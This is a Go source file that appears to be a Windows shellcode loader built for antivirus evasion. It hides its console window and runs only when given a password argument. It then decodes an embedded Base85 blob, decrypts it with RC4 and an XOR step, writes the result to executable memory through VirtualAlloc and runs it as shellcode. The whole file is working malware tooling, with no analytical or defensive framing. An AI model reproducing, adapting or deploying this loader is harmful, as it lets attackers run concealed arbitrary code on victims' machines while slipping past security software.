package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
	"os"

	"github.com/eknkc/basex"
	"github.com/gonutz/ide/w32"
)

const (
	memCommit            = 0x00001000
	memReserve           = 0x00002000
	pageExecute          = 0x10
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
	pageExecuteWrite     = 0x80
	memRelease           = 0x8000
)

func yincang(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

func main() {
	yincang(w32.SW_HIDE)

	args := os.Args
	if len(args) != 2 || args[1] != "123456" {
		fmt.Println("The program doesn't work. Try again")
		return
	}
	key := []byte("demaxiya")
	encodedMessage := "1m>R;_Qw{V848K~V>8M7Q+ES##)Q;K55=>vbi>3OSIf)~wM65dVF$^4+Iab)^!=`ZCtCJZArEBaTRzc{WEXR4yS3kn5Eqn3&sCJRkgqX?+GRR#cbowMfLUxkz<w80BUzV-^&`}3x88LluqnpL&z?C(rZ_ltB|b}JAbv*>oy48{(jjp!j$p%4#=4AFSiu37^0=%pW0tj9qz`doJHOm^HCt@#cws-*}%G)QTcSV#vN4H%H@aE7r9D&Cp&aV^9W4W8=pSid2|ahs_!B+mpnGD${WmV_7`-2rG97Oy;?;+MhCfp3Ti^|`ea5haU}s>L2PP%Gl(06$HYz^L-0hFXZZQFbvk%z`Z<T=u|n=1$T716F$A8DC_yd0Pi-GKvk9+q0E#lX=$>@3LHQox}gF)0w{p`1k{VO(s8*!YLo?+@=9LIYVLC5y$0xtr>nXEJ01603ZkG{3BUy0j=9<t7Jy%W)pQH^&4>r;qP4GD9~M<5G8RqS?^VKxCohYogWJyNMR<fS~OB>%+VN%E41ROe-=R<2oV6376v&4TR&_Wpln56xndANWM^7sF`Nc7r3<sOxJ!3{Xz6%p2h0e=Pj1U_{MPZS$VO>NvLvY}gn~-^Q20_B9)|A+$b`JEQJ8%{S7QmEr0|3P>W)7LZD`0$8^z{~517tYLy`6p<B&erfqeUnwm~`|!Yfs(5|n`iPj8_4Du3Og;bgM+tPqh~hl%9oc|Kd5KJJfvc>t`ULrg(tR-{cr|Ei}0pff8|za?t}+=Y82G63^9O>)`^+Y2NDmd@y?X%?0H%!?3QbvH!0AXw4jmjGYyl`6}VpshA(X%?)5ii3UhMEMUi|tr~j4TXz5crkyH|(4E)ub!;DAytGccMxNJlRgVT)g9CZuT_!g5!stObI$I`Y65g*4h|;UQ=Ul}>sVH&AdB})tT>7(uTzcW62$>z3dxG?Sv4bRWa&@|p4`_A8<DFRDn>XMj0pd#q4J)9pv20(u!F)S)3(6+5Vy6$Q_h10c{9|zF}@+xPlg<iObD^GZ0Vj0mm>Q77SWBfAM>;!2Cf`4Zdwx4%=Oc+l4q`4IB1)$a^`1pmt(8)!onu|YL>z`gRQGrY7`tAb$w#+{$9)ybB}vdh^B?b(D=v7cxA17LA}u<-6w(JAgKvC>IXh`fL<0uLqlty~~!YE5~#3ABz)g60Eh$J*vUHQ-W(*|`L@<w;fS#M?2BWuGv|IjCfpQEc{TtRhm#S^QsBpQ1Qny<<ddk(u&>=jM6g<AsY8_ZdYtB6S9JLd5{W)819Zi|b*W+*7HoL-&uxCpYheOn)ITHP2+$%H`_2@{UStML!kgU?w|N_&LwB7yK9^2GFU)t4zAJ!{kTXeh4a&N0n4LT;Wo(dqVR-nbmL^YE8>FTW=}xAt$Gk0a1IMYt^8q8lJ-oC(i5n%X$FruSa-+cbvm<`M*_U*t_%O1uNCY{A+2`SWt`n`|sZx3%_JQX5rO*e~G%wiBP8L%DQ7&_Z*IVa<IvA&@L=AZa*K;K5qrzbW_grUxCt`XCF$OjFl=B~XB-BqNV?^p*Ey8S|yB^bB!<H)<QqFfiPV*H7-%K3Y2)c7-(plt^G?WTa<rWrkZV|_o}|sSd7lZ<N*sPU5~xeCki4dM-9_X7MNA%j9?}g!`Dm4RDa$-fE{?;#ss%Vn#Qq?Do<VcI>!!td?JyrY48%S30aQs?+^+(W&YdV=}{1itbpRl?cNbZM*afT7}s$p1CPP>C&~+OoUY{#`{OfF|1zwz!llrNUBr<p)hCZVeQy3=c7lMb4C<_uQsDE*D6e>OHxMDuh|+yzrfxiKM~A8H6-2xkBi#c;CwIv=ANUwvKjbwBQpjYmBE(NfT&s>(QEGJTjDHgAPM-I1}>6B;8xG{_zG}%$Vsa8TRn&xMZFqRudl8f-wImH<go$4MM8P%U6Jk^8Tzp)uDVJ{Y~lz2(ZPxcazpzJZ6>R0TUmK1YRK#jPnJ_7}ioD)D4jWwvu`dWb^H%y^o6~@_;m!!>f=g~EN=Pv=%-$*?k<)Vy#9|Eq0Em+qY^{I%^*(7c4J%pCFS7#Utnv$puYlDaL;Z`m>)}tyvR221X{)@45T;(-lw)s&9cYki%|@Jozcf)7QYXi#EuVQvkFo-9auEO=_?De5qax$;*4ESDAVb~@RTZzUg{O~<#<Q$s9{T(}VJ4gHw|_6=nio0NI`twwa"
	//111
	// Base85 解码
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	hexCiphertext, _ := base85.Decode(encodedMessage)

	// 转为二进制
	rc4Message := make([]byte, hex.DecodedLen(len(hexCiphertext)))
	n, _ := hex.Decode(rc4Message, hexCiphertext)
	rc4Message = rc4Message[:n]

	// RC4 解密
	cipher, _ := rc4.NewCipher(key)
	xordMessage := make([]byte, len(rc4Message))
	cipher.XORKeyStream(xordMessage, rc4Message)

	// XOR 操作
	message := make([]byte, len(xordMessage))
	for i := 0; i < len(xordMessage); i++ {
		message[i] = xordMessage[i] ^ 0xff
	}

	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	VirtualAlloc, _ := syscall.GetProcAddress(kernel32, "VirtualAlloc")
	VirtualFree, _ := syscall.GetProcAddress(kernel32, "VirtualFree")

	// 分配内存并写入解密后的二进制数据
	allocSize := uintptr(len(message))
	mem, _, err := syscall.Syscall6(uintptr(VirtualAlloc), 4, 0, allocSize, memCommit|memReserve, pageExecuteReadWrite, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("VirtualAlloc failed with error code %d", err))
	}
	buffer := (*[1 << 30]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, message)

	// 执行解密后的二进制数据
	_, _, err = syscall.Syscall(uintptr(mem), 0, 0, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("Failed to execute shellcode with error code %d", err))
	}

	// 释放内存
	_, _, err = syscall.Syscall6(uintptr(VirtualFree), 3, mem, 0, memRelease, 0, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("Failed to release memory with error code %d", err))
	}
}
